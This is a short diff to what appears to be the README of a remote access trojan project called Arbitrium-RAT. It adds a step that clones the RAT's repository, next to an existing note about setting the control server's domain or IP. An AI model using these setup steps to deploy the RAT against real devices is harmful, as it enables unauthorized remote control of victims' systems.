@@ -53,6 +53,10 @@ Winrar (Windows only)
 > :warning: use `setAPI_FQDN.sh` first to set the server domain/IP in all files
 
 
+Clone repo:
+ 
+`git clone https://github.com/BenChaliah/Arbitrium-RAT.git --recursive`
+
 
 1. Android
 ```shell
